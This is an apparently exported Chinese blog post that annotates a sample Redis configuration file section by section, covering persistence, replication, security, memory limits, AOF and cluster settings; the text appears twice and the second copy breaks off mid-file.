这里的路径跟文件名要分开配置是因为redis在进行备份时，先会将当前数据库的状态写入到一个临时文件中，等备份完成时，\n# 再把该该临时文件替换为上面所指定的文件，而这里的临时文件和上面所配置的备份文件都会放在这个指定的路径当中。\n# \n# AOF文件也会存放在这个目录下面\n# \n# 注意这里必须制定一个目录而不是文件\n#\n# 这个配置项默认值为“./”，最好改相对路径为绝对路径\n# 如果为相对路径，redis在哪里启动，dump.rdb文件就会产生在启动的目录\n# 这也就是有些人重启redis后key值消失的原因\n#\ndir ./\n\n################################# 主从复制 #################################\n\n# 主从复制. 设置该数据库为其他数据库的从数据库. \n# 设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步\n#\nslaveof <masterip> <masterport>\n\n# 当master服务设置了密码保护时(用requirepass制定的密码)\n# slav服务连接master的密码\n# \nmasterauth <master-password>\n\n# 当从库同主机失去连接或者复制正在进行，从机库有两种运行方式：\n#\n# 1) 如果slave-serve-stale-data设置为yes(默认设置)，从库会继续相应客户端的请求\n# \n# 2) 如果slave-serve-stale-data是指为no，出去INFO和SLAVOF命令之外的任何请求都会返回一个\n#    错误\"SYNC with master in progress\"\n#\nslave-serve-stale-data yes\n\n# 你可以配置一个 slave 实体是否接受写入操作。\n# 通过写入操作来存储一些短暂的数据对于一个 slave 实例来说可能是有用的，\n# 因为相对从 master 重新同步数而言，据数据写入到 slave 会更容易被删除。\n# 但是如果客户端因为一个错误的配置写入，也可能会导致一些问题。\n#\n# 从 redis 2.6 版起，默认 slaves 都是只读的。\n#\n# Note: read only slaves are not designed to be exposed to untrusted clients\n# on the internet. It's just a protection layer against misuse of the instance.\n# Still a read only slave exports by default all the administrative commands\n# such as CONFIG, DEBUG, and so forth. To a limited extent you can improve\n# security of read only slaves using 'rename-command' to shadow all the\n# administrative / dangerous commands.\n# 注意：只读的 slaves 没有被设计成在 internet 上暴露给不受信任的客户端。\n# 它仅仅是一个针对误用实例的一个保护层。\nslave-read-only yes\n\n# Slaves 在一个预定义的时间间隔内发送 ping 命令到 server 。\n# 你可以改变这个时间间隔。默认为 10 秒。\n#\n# repl-ping-slave-period 10\n\n# The following option sets the replication timeout for:\n# 设置主从复制过期时间\n#\n# 1) Bulk transfer I/O during SYNC, from the point of view of slave.\n# 2) Master timeout from the point of view of slaves (data, pings).\n# 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).\n#\n# It is important to make sure that this value is greater than the value\n# specified for repl-ping-slave-period otherwise a timeout will be detected\n# every time there is low traffic between the master and the slave.\n# 这个值一定要比 repl-ping-slave-period 大\n#\n# repl-timeout 60\n \n# Disable TCP_NODELAY on the slave socket after SYNC?\n#\n# If you select \"yes\" Redis will use a smaller number of TCP packets and\n# less bandwidth to send data to slaves. But this can add a delay for\n# the data to appear on the slave side, up to 40 milliseconds with\n# Linux kernels using a default configuration.\n#\n# If you select \"no\" the delay for data to appear on the slave side will\n# be reduced but more bandwidth will be used for replication.\n#\n# By default we optimize for low latency, but in very high traffic conditions\n# or when the master and slaves are many hops away, turning this to \"yes\" may\n# be a good idea.\nrepl-disable-tcp-nodelay no\n \n# 设置主从复制容量大小。这个 backlog 是一个用来在 slaves 被断开连接时\n# 存放 slave 数据的 buffer，所以当一个 slave 想要重新连接，通常不希望全部重新同步，\n# 只是部分同步就够了，仅仅传递 slave 在断开连接时丢失的这部分数据。\n#\n# The biggest the replication backlog, the longer the time the slave can be\n# disconnected and later be able to perform a partial resynchronization.\n# 这个值越大，salve 可以断开连接的时间就越长。\n#\n# The backlog is only allocated once there is at least a slave connected.\n#\n# repl-backlog-size 1mb\n \n# After a master has no longer connected slaves for some time, the backlog\n# will be freed. The following option configures the amount of seconds that\n# need to elapse, starting from the time the last slave disconnected, for\n# the backlog buffer to be freed.\n# 在某些时候，master 不再连接 slaves，backlog 将被释放。\n#\n# A value of 0 means to never release the backlog.\n# 如果设置为 0 ，意味着绝不释放 backlog 。\n#\n# repl-backlog-ttl 3600\n \n# 当 master 不能正常工作的时候，Redis Sentinel 会从 slaves 中选出一个新的 master，\n# 这个值越小，就越会被优先选中，但是如果是 0 ， 那是意味着这个 slave 不可能被选中。\n#\n# 默认优先级为 100。\nslave-priority 100\n \n# It is possible for a master to stop accepting writes if there are less than\n# N slaves connected, having a lag less or equal than M seconds.\n#\n# The N slaves need to be in \"online\" state.\n#\n# The lag in seconds, that must be <= the specified value, is calculated from\n# the last ping received from the slave, that is usually sent every second.\n#\n# This option does not GUARANTEES that N replicas will accept the write, but\n# will limit the window of exposure for lost writes in case not enough slaves\n# are available, to the specified number of seconds.\n#\n# For example to require at least 3 slaves with a lag <= 10 seconds use:\n#\n# min-slaves-to-write 3\n# min-slaves-max-lag 10\n#\n# Setting one or the other to 0 disables the feature.\n#\n# By default min-slaves-to-write is set to 0 (feature disabled) and\n# min-slaves-max-lag is set to 10.   \n\n################################## 安全 ###################################\n \n# 设置客户端连接后进行任何其他指定前需要使用的密码。\n# 警告：因为redis速度相当快，所以在一台比较好的服务器下，一个外部的用户可以在一秒钟进行150K次的密码尝试，这意味着你需要指定非常非常强大的密码来防止暴力破解\n#\nrequirepass foobared\n \n# 命令重命名.\n#\n# 在一个共享环境下可以重命名相对危险的命令。比如把CONFIG重名为一个不容易猜测的字符。\n#\n# 举例:\n#\n# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52\n#\n# 如果想删除一个命令，直接把它重命名为一个空字符\"\"即可，如下：\n#\n# rename-command CONFIG \"\"\n#\n# Please note that changing the name of commands that are logged into the\n# AOF file or transmitted to slaves may cause problems.\n\n\n################################### 约束 ####################################\n \n# 设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，\n# 如果设置 maxclients 0，表示不作限制。\n# 当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息\n#\n# maxclients 128\n \n# 指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key\n# Redis同时也会移除空的list对象\n#\n# 当此方法处理后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作\n# \n# 注意：Redis新的vm机制，会把Key存放内存，Value会存放在swap区\n#\n# maxmemory的设置比较适合于把redis当作于类似memcached的缓存来使用，而不适合当做一个真实的DB。\n# 当把Redis当做一个真实的数据库使用的时候，内存使用将是一个很大的开销\n# maxmemory <bytes>\n \n# 当内存达到最大值的时候Redis会选择删除哪些数据？有五种方式可供选择\n# \n# volatile-lru -> 利用LRU算法移除设置过过期时间的key (LRU:最近使用 Least Recently Used )\n# allkeys-lru -> 利用LRU算法移除任何key\n# volatile-random -> 移除设置过过期时间的随机key\n# allkeys->random -> remove a random key, any key\n# volatile-ttl -> 移除即将过期的key(minor TTL)\n# noeviction -> 不移除任何可以，只是返回一个写错误\n# \n# 注意：对于上面的策略，如果没有合适的key可以移除，当写的时候Redis会返回一个错误\n#\n#       写命令包括: set setnx setex append\n#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd\n#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby\n#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby\n#       getset mset msetnx exec sort\n#\n# 默认是:\n#\n# maxmemory-policy volatile-lru\n \n# LRU 和 minimal TTL 算法都不是精准的算法，但是相对精确的算法(为了节省内存)，随意你可以选择样本大小进行检测。\n# Redis默认的灰选择3个样本进行检测，你可以通过maxmemory-samples进行设置\n#\n# maxmemory-samples 3\n\n#################################### AOF ####################################\n \n# 默认情况下，redis会在后台异步的把数据库镜像备份到磁盘，但是该备份是非常耗时的，而且备份也不能很频繁，如果发生诸如拉闸限电、拔插头等状况，那么将造成比较大范围的数据丢失。\n# 所以redis提供了另外一种更加高效的数据库备份及灾难恢复方式。\n# 开启append only模式之后，redis会把所接收到的每一次写操作请求都追加到appendonly.aof文件中，当redis重新启动时，会从该文件恢复出之前的状态。\n# 但是这样会造成appendonly.aof文件过大，所以redis还支持了BGREWRITEAOF指令，对appendonly.aof 进行重新整理。\n# 你可以同时开启asynchronous dumps 和 AOF\n \nappendonly no\n \n# AOF文件名称 (默认: \"appendonly.aof\")\n# appendfilename appendonly.aof\n \n \n# Redis支持三种同步AOF文件的策略:\n#\n# no: 不进行同步，系统去操作 . Faster.\n# always: always表示每次有写操作都进行同步. Slow, Safest.\n# everysec: 表示对写操作进行累积，每秒同步一次. Compromise.\n#\n# 默认是\"everysec\"，按照速度和安全折中这是最好的。\n# 如果想让Redis能更高效的运行，你也可以设置为\"no\"，让操作系统决定什么时候去执行\n# 或者相反想让数据更安全你也可以设置为\"always\"\n#\n# 如果不确定就用 \"everysec\".\n \n# appendfsync always\nappendfsync everysec\n# appendfsync no\n \n# AOF策略设置为always或者everysec时，后台处理进程(后台保存或者AOF日志重写)会执行大量的I/O操作\n# 在某些Linux配置中会阻止过长的fsync()请求。注意现在没有任何修复，即使fsync在另外一个线程进行处理\n#\n# 为了减缓这个问题，可以设置下面这个参数no-appendfsync-on-rewrite\n#\n# This means that while another child is saving the durability of Redis is\n# the same as \"appendfsync none\", that in pratical terms means that it is\n# possible to lost up to 30 seconds of log in the worst scenario (with the\n# default Linux settings).\n# \n# If you have latency problems turn this to \"yes\". Otherwise leave it as\n# \"no\" that is the safest pick from the point of view of durability.\nno-appendfsync-on-rewrite no\n \n# Automatic rewrite of the append only file.\n# AOF 自动重写\n# 当AOF文件增长到一定大小的时候Redis能够调用 BGREWRITEAOF 对日志文件进行重写 \n# \n# 它是这样工作的：Redis会记住上次进行些日志后文件的大小(如果从开机以来还没进行过重写，那日子大小在开机的时候确定)\n#\n# 基础大小会同现在的大小进行比较。如果现在的大小比基础大小大制定的百分比，重写功能将启动\n# 同时需要指定一个最小大小用于AOF重写，这个用于阻止即使文件很小但是增长幅度很大也去重写AOF文件的情况\n# 设置 percentage 为0就关闭这个特性\n \n \nauto-aof-rewrite-percentage 100\nauto-aof-rewrite-min-size 64mb\n\n############################## LUA SCRIPTING  ###############################\n \n# Max execution time of a Lua script in milliseconds.\n#\n# If the maximum execution time is reached Redis will log that a script is\n# still in execution after the maximum allowed time and will start to\n# reply to queries with an error.\n#\n# When a long running script exceed the maximum execution time only the\n# SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be\n# used to stop a script that did not yet called write commands. The second\n# is the only way to shut down the server in the case a write commands was\n# already issue by the script but the user don't want to wait for the natural\n# termination of the script.\n#\n# Set it to 0 or a negative value for unlimited execution without warnings.\nlua-time-limit 5000\n\n################################ REDIS 集群  ###############################\n#\n# 启用或停用集群\n# cluster-enabled yes\n \n# Every cluster node has a cluster configuration file. This file is not\n# intended to be edited by hand. It is created and updated by Redis nodes.\n# Every Redis Cluster node requires a different cluster configuration file.\n# Make sure that instances running in the same system does not have\n# overlapping cluster configuration file names.\n#\n# cluster-config-file nodes-6379.conf\n \n# Cluster node timeout is the amount of milliseconds a node must be unreachable \n# for it to be considered in failure state.\n# Most other internal time limits are multiple of the node timeout.\n#\n# cluster-node-timeout 15000\n \n# A slave of a failing master will avoid to start a failover if its data\n# looks too old.\n#\n# There is no simple way for a slave to actually have a exact measure of\n# its \"data age\", so the following two checks are performed:\n#\n# 1) If there are multiple slaves able to failover, they exchange messages\n#    in order to try to give an advantage to the slave with the best\n#    replication offset (more data from the master processed).\n#    Slaves will try to get their rank by offset, and apply to the start\n#    of the failover a delay proportional to their rank.\n#\n# 2) Every single slave computes the time of the last interaction with\n#    its master. This can be the last ping or command received (if the master\n#    is still in the \"connected\" state), or the time that elapsed since the\n#    disconnection with the master (if the replication link is currently down).\n#    If the last interaction is too old, the slave will not try to failover\n#    at all.\n#\n# The point \"2\" can be tuned by user. Specifically a slave will not perform\n# the failover if, since the last interaction with the master, the time\n# elapsed is greater than:\n#\n#   (node-timeout * slave-validity-factor) + repl-ping-slave-period\n#\n# So for example if node-timeout is 30 seconds, and the slave-validity-factor\n# is 10, and assuming a default repl-ping-slave-period of 10 seconds, the\n# slave will not try to failover if it was not able to talk with the master\n# for longer than 310 seconds.\n#\n# A large slave-validity-factor may allow slaves with too old data to failover\n# a master, while a too small value may prevent the cluster from being able to\n# elect a slave at all.\n#\n# For maximum availability, it is possible to set the slave-validity-factor\n# to a value of 0, which means, that slaves will always try to failover the\n# master regardless of the last time they interacted with the master.\n# (However they'll always try to apply a delay proportional to their\n# offset rank).\n#\n# Zero is the only value able to guarantee that when all the partitions heal\n# the cluster will always be able to continue.\n#\n# cluster-slave-validity-factor 10\n \n# Cluster slaves are able to migrate to orphaned masters, that are masters\n# that are left without working slaves. This improves the cluster ability\n# to resist to failures as otherwise an orphaned master can't be failed over\n# in case of failure if it has no working slaves.\n#\n# Slaves migrate to orphaned masters only if there are still at least a\n# given number of other working slaves for their old master. This number\n# is the \"migration barrier\". A migration barrier of 1 means that a slave\n# will migrate only if there is at least 1 other working slave for its master\n# and so forth. It usually reflects the number of slaves you want for every\n# master in your cluster.\n#\n# Default is 1 (slaves migrate only if their masters remain with at least\n# one slave). To disable migration just set it to a very large value.\n# A value of 0 can be set but is useful only for debugging and dangerous\n# in production.\n#\n# cluster-migration-barrier 1\n \n# In order to setup your cluster make sure to read the documentation\n# available at http://redis.io web site.\n\n################################## SLOW LOG ###################################\n \n# Redis Slow Log 记录超过特定执行时间的命令。执行时间不包括I/O计算比如连接客户端，返回结果等，只是命令执行时间\n# \n# 可以通过两个参数设置slow log：一个是告诉Redis执行超过多少时间被记录的参数slowlog-log-slower-than(微妙)，\n# 另一个是slow log 的长度。当一个新命令被记录的时候最早的命令将被从队列中移除\n \n \n# 下面的时间以微妙微单位，因此1000000代表一分钟。\n# 注意制定一个负数将关闭慢日志，而设置为0将强制每个命令都会记录\nslowlog-log-slower-than 10000\n \n \n# 对日志长度没有限制，只是要注意它会消耗内存\n# 可以通过 SLOWLOG RESET 回收被慢日志消耗的内存\nslowlog-max-len 102\n\n############################# Event notification ##############################\n \n# Redis can notify Pub/Sub clients about events happening in the key space.\n# This feature is documented at http://redis.io/topics/keyspace-events\n# \n# For instance if keyspace events notification is enabled, and a client\n# performs a DEL operation on key \"foo\" stored in the Database 0, two\n# messages will be published via Pub/Sub:\n#\n# PUBLISH __keyspace@0__:foo del\n# PUBLISH __keyevent@0__:del foo\n#\n# It is possible to select the events that Redis will notify among a set\n# of classes. Every class is identified by a single character:\n#\n#  K     Keyspace events, published with __keyspace@<db>__ prefix.\n#  E     Keyevent events, published with __keyevent@<db>__ prefix.\n#  g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...\n#  $     String commands\n#  l     List commands\n#  s     Set commands\n#  h     Hash commands\n#  z     Sorted set commands\n#  x     Expired events (events generated every time a key expires)\n#  e     Evicted events (events generated when a key is evicted for maxmemory)\n#  A     Alias for g$lshzxe, so that the \"AKE\" string means all the events.\n#\n#  The \"notify-keyspace-events\" takes as argument a string that is composed\n#  by zero or multiple characters. The empty string means that notifications\n#  are disabled at all.\n#\n#  Example: to enable list and generic events, from the point of view of the\n#           event name, use:\n#\n#  notify-keyspace-events Elg\n#\n#  Example 2: to get the stream of the expired keys subscribing to channel\n#             name __keyevent@0__:expired use:\n#\n#  notify-keyspace-events Ex\n#\n#  By default all notifications are disabled because most users don't need\n#  this feature and the feature has some overhead. Note that if you don't\n#  specify at least one of K or E, no events will be delivered.\nnotify-keyspace-events \"\"\n\n############################### ADVANCED CONFIG ###############################\n \n# 当hash中包含超过指定元素个数并且最大的元素没有超过临界时，\n# hash将以一种特殊的编码方式（大大减少内存使用）来存储，这里可以设置这两个临界值\n# Redis Hash对应Value内部实际就是一个HashMap，实际这里会有2种不同实现，\n# 这个Hash的成员比较少时Redis为了节省内存会采用类似一维数组的方式来紧凑存储，而不会采用真正的HashMap结构，对应的value redisObject的encoding为zipmap,\n# 当成员数量增大时会自动转成真正的HashMap,此时encoding为ht。\nhash-max-zipmap-entries 512\nhash-max-zipmap-value 64\n \n# list数据类型多少节点以下会采用去指针的紧凑存储格式。\n# list数据类型节点值大小小于多少字节会采用紧凑存储格式。\nlist-max-ziplist-entries 512\nlist-max-ziplist-value 64\n \n# set数据类型内部数据如果全部是数值型，且包含多少节点以下会采用紧凑格式存储。\nset-max-intset-entries 512\n \n# zsort数据类型多少节点以下会采用去指针的紧凑存储格式。\n# zsort数据类型节点值大小小于多少字节会采用紧凑存储格式。\nzset-max-ziplist-entries 128\nzset-max-ziplist-value 64\n \n \n# Redis将在每100毫秒时使用1毫秒的CPU时间来对redis的hash表进行重新hash，可以降低内存的使用\n# \n# 当你的使用场景中，有非常严格的实时性需要，不能够接受Redis时不时的对请求有2毫秒的延迟的话，把这项配置为no。\n#\n# 如果没有这么严格的实时性要求，可以设置为yes，以便能够尽可能快的释放内存\nactiverehashing yes\n\n# HyperLogLog sparse representation bytes limit. The limit includes the\n# 16 bytes header. When an HyperLogLog using the sparse representation crosses\n# this limit, it is converted into the dense representation.\n#\n# A value greater than 16000 is totally useless, since at that point the\n# dense representation is more memory efficient.\n# \n# The suggested value is ~ 3000 in order to have the benefits of\n# the space efficient encoding without slowing down too much PFADD,\n# which is O(N) with the sparse encoding. The value can be raised to\n# ~ 10000 when CPU is not a concern, but space is, and the data set is\n# composed of many HyperLogLogs with cardinality in the 0 - 15000 range.\nhll-sparse-max-bytes 3000\n\n# The client output buffer limits can be used to force disconnection of clients\n# that are not reading data from the server fast enough for some reason (a\n# common reason is that a Pub/Sub client can't consume messages as fast as the\n# publisher can produce them).\n#\n# The limit can be set differently for the three different classes of clients:\n#\n# normal -> normal clients\n# slave  -> slave clients and MONITOR clients\n# pubsub -> clients subscribed to at least one pubsub channel or pattern\n#\n# The syntax of every client-output-buffer-limit directive is the following:\n#\n# client-output-buffer-limit <class> <hard limit> <soft limit> <soft seconds>\n#\n# A client is immediately disconnected once the hard limit is reached, or if\n# the soft limit is reached and remains reached for the specified number of\n# seconds (continuously).\n# So for instance if the hard limit is 32 megabytes and the soft limit is\n# 16 megabytes / 10 seconds, the client will get disconnected immediately\n# if the size of the output buffers reach 32 megabytes, but will also get\n# disconnected if the client reaches 16 megabytes and continuously overcomes\n# the limit for 10 seconds.\n#\n# By default normal clients are not limited because they don't receive data\n# without asking (in a push way), but just after a request, so only\n# asynchronous clients may create a scenario where data is requested faster\n# than it can read.\n#\n# Instead there is a default limit for pubsub and slave clients, since\n# subscribers and slaves receive data in a push fashion.\n#\n# Both the hard or the soft limit can be disabled by setting them to zero.\nclient-output-buffer-limit normal 0 0 0\nclient-output-buffer-limit slave 256mb 64mb 60\nclient-output-buffer-limit pubsub 32mb 8mb 60\n \n# Redis calls an internal function to perform many background tasks, like\n# closing connections of clients in timeout, purging expired keys that are\n# never requested, and so forth.\n#\n# Not all tasks are performed with the same frequency, but Redis checks for\n# tasks to perform accordingly to the specified \"hz\" value.\n#\n# By default \"hz\" is set to 10. Raising the value will use more CPU when\n# Redis is idle, but at the same time will make Redis more responsive when\n# there are many keys expiring at the same time, and timeouts may be\n# handled with more precision.\n#\n# The range is between 1 and 500, however a value over 100 is usually not\n# a good idea. Most users should use the default of 10 and raise this up to\n# 100 only in environments where very low latency is required.\nhz 10\n \n# When a child rewrites the AOF file, if the following option is enabled\n# the file will be fsync-ed every 32 MB of data generated. This is useful\n# in order to commit the file to the disk more incrementally and avoid\n# big latency spikes.\naof-rewrite-incremental-fsync yes\n \n################################## INCLUDES ###################################\n \n# 假如说你有一个可用于所有的 redis server 的标准配置模板，\n# 但针对某些 server 又需要一些个性化的设置，\n# 你可以使用 include 来包含一些其他的配置文件，这对你来说是非常有用的。\n#\n# 但是要注意哦，include 是不能被 config rewrite 命令改写的\n# 由于 redis 总是以最后的加工线作为一个配置指令值，所以你最好是把 include 放在这个文件的最前面，\n# 以避免在运行时覆盖配置的改变，相反，你就把它放在后面（外国人真啰嗦）。\n#\n# include /path/to/local.conf\n# include /path/to/other.conf\n\n```","source":"_posts/Redis配置文件详解.md","raw":"---\ntitle: Redis配置文件详解\ncategories:\n  - 运维部署\ntags:\n  - redis\ndate: 2016-9-20 22:10:00\ntoc: false\n\n---\n\n**REDIS 配置文件示例:**\n<!-- more -->\n\n```bash\n# redis 配置文件示例\n#\n# 当你需要为某个配置项指定内存大小的时候，必须要带上单位，\n# 通常的格式就是 1k 5gb 4m 等酱紫：\n#\n# 1k => 1000 bytes\n# 1kb => 1024 bytes\n# 1m => 1000000 bytes\n# 1mb => 1024*1024 bytes\n# 1g => 1000000000 bytes\n# 1gb => 1024*1024*1024 bytes\n#\n# 内存配置大小写是一样的.比如 1gb 1Gb 1GB 1gB\n\n################################ 常用 #####################################\n\n# daemonize no 默认情况下redis不是作为守护进程运行的\n# 如果你想让它在后台运行，你就把它改成 yes\ndaemonize yes\n\n# 当redis在后台运行的时候，默认会把pid文件放在/var/run/redis.pid，你可以配置到其他地址。\n# 当运行多个redis服务时，需要指定不同的pid文件和端口\npidfile /var/run/redis.pid\n\n# 指定redis运行的端口，默认是6379\nport 6379\n\n# TCP 监听的最大容纳数量\n#\n# 在高并发的环境下，你需要把这个值调高以避免客户端连接缓慢的问题。\n# Linux 内核会一声不响的把这个值缩小成 /proc/sys/net/core/somaxconn 对应的值，\n# 所以你要修改这两个值才能达到你的预期。\n# tcp-backlog 511\n\n# 默认情况下，redis 在 server 上所有有效的网络接口上监听客户端连接。\n# 你如果只想让它在一个网络接口上监听，那你就绑定一个IP或者多个IP。\n#\n# 示例，多个IP用空格隔开:\n#\n# bind 192.168.1.100 10.0.0.1\nbind 127.0.0.1\n\n# Specify the path for the unix socket that will be used to listen for\n# incoming connections. There is no default, so Redis will not listen\n# on a unix socket when not specified.\n# 指定 unix socket 的路径。\n#\n# unixsocket /tmp/redis.sock\n# unixsocketperm 755\n\n# 设置客户端连接时的超时时间，单位为秒。当客户端在这段时间内没有发出任何指令，那么关闭该连接\n# 0是关闭此设置\ntimeout 0\n\n# tcp 心跳包。\n#\n# 如果设置为非零，则在与客户端缺乏通讯的时候使用 SO_KEEPALIVE 发送 tcp acks 给客户端。\n# 这个之所有有用，主要由两个原因：\n#\n# 1) 防止死的 peers\n# 2) Take the connection alive from the point of view of network\n#    equipment in the middle.\n#\n# On Linux, the specified value (in seconds) is the period used to send ACKs.\n# Note that to close the connection the double of the time is needed.\n# On other kernels the period depends on the kernel configuration.\n#\n# A reasonable value for this option is 60 seconds.\n# 推荐一个合理的值就是60秒\ntcp-keepalive 0\n\n# 指定日志记录级别\n# Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose\n# debug 记录很多信息，用于开发和测试\n# varbose 有用的信息，不像debug会记录那么多\n# notice 普通的verbose，常用于生产环境\n# warning 只有非常重要或者严重的信息会记录到日志\nloglevel debug\n\n# 配置log文件地址，不同的redis实例设置不同的日志文件，便于问题定位\n# 默认值为stdout，标准输出，若后台模式会输出到/dev/null\n# logfile stdout\nlogfile /var/log/redis/redis.log\n\n# 要想把日志记录到系统日志，就把它改成 yes，\n# 也可以可选择性的更新其他的syslog 参数以达到你的要求\n# syslog-enabled no\n\n# 设置 syslog 的 identity。\n# syslog-ident redis\n \n# 设置 syslog 的 facility，必须是 USER 或者是 LOCAL0-LOCAL7 之间的值。\n# syslog-facility local0\n\n# 设置数据库的数目。\n# 默认数据库是 DB 0，你可以在每个连接上使用 select <dbid> 命令选择一个不同的数据库，\n# 但是 dbid 必须是一个介于 0 到 databasees - 1 之间的值\ndatabases 16\n\n################################ 快照 #################################\n\n#\n# 存 DB 到磁盘：\n#\n#   格式：save <间隔时间（秒）> <写入次数>\n#\n#   根据给定的时间间隔和写入次数将数据保存到磁盘\n#\n#   下面的例子的意思是：\n#   900 秒内如果至少有 1 个 key 的值变化，则保存\n#   300 秒内如果至少有 10 个 key 的值变化，则保存\n#   60 秒内如果至少有 10000 个 key 的值变化，则保存\n#　　\n#   注意：你可以注释掉所有的 save 行来停用保存功能。\n#   也可以直接一个空字符串来实现停用：\n#   save \"\"\n \nsave 900 1\nsave 300 10\nsave 60 10000\n\n# 默认情况下，如果 redis 最后一次的后台保存失败，redis 将停止接受写操作，\n# 这样以一种强硬的方式让用户知道数据不能正确的持久化到磁盘，\n# 否则就会没人注意到灾难的发生。\n#\n# 如果后台保存进程重新启动工作了，redis 也将自动的允许写操作。\n#\n# 然而你要是安装了靠谱的监控，你可能不希望 redis 这样做，那你就改成 no 好了。\nstop-writes-on-bgsave-error yes\n \n# 是否在 dump .rdb 数据库的时候使用 LZF 压缩字符串\n# 默认都设为 yes\n# 如果你希望保存子进程节省点 cpu ，你就设置它为 no ，\n# 不过这个数据集可能就会比较大\nrdbcompression yes\n\n# 是否校验rdb文件\nrdbchecksum yes\n\n# 本地持久化数据库文件名，默认值为dump.rdb\n# 不同的redis实例设置不同的db文件，便于问题定位\ndbfilename dump.rdb\n\n# 工作目录\n#\n# 数据库镜像备份的文件放置的路径。\n# 这里的路径跟文件名要分开配置是因为redis在进行备份时，先会将当前数据库的状态写入到一个临时文件中，等备份完成时，\n# 再把该该临时文件替换为上面所指定的文件，而这里的临时文件和上面所配置的备份文件都会放在这个指定的路径当中。\n# \n# AOF文件也会存放在这个目录下面\n# \n# 注意这里必须制定一个目录而不是文件\n#\n# 这个配置项默认值为“./”，最好改相对路径为绝对路径\n# 如果为相对路径，redis在哪里启动，dump.rdb文件就会产生在启动的目录\n# 这也就是有些人重启redis后key值消失的原因\n#\ndir ./\n\n################################# 主从复制 #################################\n\n# 主从复制. 设置该数据库为其他数据库的从数据库. \n# 设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步\n#\nslaveof <masterip> <masterport>\n\n# 当master服务设置了密码保护时(用requirepass制定的密码)\n# slav服务连接master的密码\n# \nmasterauth <master-password>\n\n# 当从库同主机失去连接或者复制正在进行，从机库有两种运行方式：\n#\n# 1) 如果slave-serve-stale-data设置为yes(默认设置)，从库会继续相应客户端的请求\n# \n# 2) 如果slave-serve-stale-data是指为no，出去INFO和SLAVOF命令之外的任何请求都会返回一个\n#    错误\"SYNC with master in progress\"\n#\nslave-serve-stale-data yes\n\n# 你可以配置一个 slave 实体是否接受写入操作。\n# 通过写入操作来存储一些短暂的数据对于一个 slave 实例来说可能是有用的，\n# 因为相对从 master 重新同步数而言，据数据写入到 slave 会更容易被删除。\n# 但是如果客户端因为一个错误的配置写入，也可能会导致一些问题。\n#\n# 从 redis 2.6 版起，默认 slaves 都是只读的。\n#\n# Note: read only slaves are not designed to be exposed to untrusted clients\n# on the internet. It's just a protection layer against misuse of the instance.\n# Still a read only slave exports by default all the administrative commands\n# such as CONFIG, DEBUG, and so forth. To a limited extent you can improve\n# security of read only slaves using 'rename-command' to shadow all the\n# administrative / dangerous commands.\n# 注意：只读的 slaves 没有被设计成在 internet 上暴露给不受信任的客户端。\n# 它仅仅是一个针对误用实例的一个保护层。\nslave-read-only yes\n\n# Slaves 在一个预定义的时间间隔内发送 ping 命令到 server 。\n# 你可以改变这个时间间隔。默认为 10 秒。\n#\n# repl-ping-slave-period 10\n\n# The following option sets the replication timeout for:\n# 设置主从复制过期时间\n#\n# 1) Bulk transfer I/O during SYNC, from the point of view of slave.\n# 2) Master timeout from the point of view of slaves (data, pings).\n# 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).\n#\n# It is important to make sure that this value is greater than the value\n# specified for repl-ping-slave-period otherwise a timeout will be detected\n# every time there is low traffic between the master and the slave.\n# 这个值一定要比 repl-ping-slave-period 大\n#\n# repl-timeout 60\n \n# Disable TCP_NODELAY on the slave socket after SYNC?\n#\n# If you select \"yes\" Redis will use a smaller number of TCP packets and\n# less bandwidth to send data to slaves. But this can add a delay for\n# the data to appear on the slave side, up to 40 milliseconds with\n# Linux kernels using a default configuration.\n#\n# If you select \"no\" the delay for data to appear on the slave side will\n# be reduced but more bandwidth will be used for replication.\n#\n# By default we optimize for low latency, but in very high traffic conditions\n# or when the master and slaves are many hops away, turning this to \"yes\" may\n# be a good idea.\nrepl-disable-tcp-nodelay no\n \n# 设置主从复制容量大小。这个 backlog 是一个用来在 slaves 被断开连接时\n# 存放 slave 数据的 buffer，所以当一个 slave 想要重新连接，通常不希望全部重新同步，\n# 只是部分同步就够了，仅仅传递 slave 在断开连接时丢失的这部分数据。\n#\n# The biggest the replication backlog, the longer the time the slave can be\n# disconnected and later be able to perform a partial resynchronization.\n# 这个值越大，salve 可以断开连接的时间就越长。\n#\n# The backlog is only allocated once there is at least a slave connected.\n#\n# repl-backlog-size 1mb\n \n# After a master has no longer connected slaves for some time, the backlog\n# will be freed. The following option configures the amount of seconds that\n# need to elapse, starting from the time the last slave disconnected, for\n# the backlog buffer to be freed.\n# 在某些时候，master 不再连接 slaves，backlog 将被释放。\n#\n# A value of 0 means to never release the backlog.\n# 如果设置为 0 ，意味着绝不释放 backlog 。\n#\n# repl-backlog-ttl 3600\n \n# 当 master 不能正常工作的时候，Redis Sentinel 会从 slaves 中选出一个新的 master，\n# 这个值越小，就越会被优先选中，但是如果是 0 ， 那是意味着这个 slave 不可能被选中。\n#\n# 默认优先级为 100。\nslave-priority 100\n \n# It is possible for a master to stop accepting writes if there are less than\n# N slaves connected, having a lag less or equal than M seconds.\n#\n# The N slaves need to be in \"online\" state.\n#\n# The lag in seconds, that must be <= the specified value, is calculated from\n# the last ping received from the slave, that is usually sent every second.\n#\n# This option does not GUARANTEES that N replicas will accept the write, but\n# will limit the window of exposure for lost writes in case not enough slaves\n# are available, to the specified number of seconds.\n#\n# For example to require at least 3 slaves with a lag <= 10 seconds use:\n#\n# min-slaves-to-write 3\n# min-slaves-max-lag 10\n#\n# Setting one or the other to 0 disables the feature.\n#\n# By default min-slaves-to-write is set to 0 (feature disabled) and\n# min-slaves-max-lag is set to 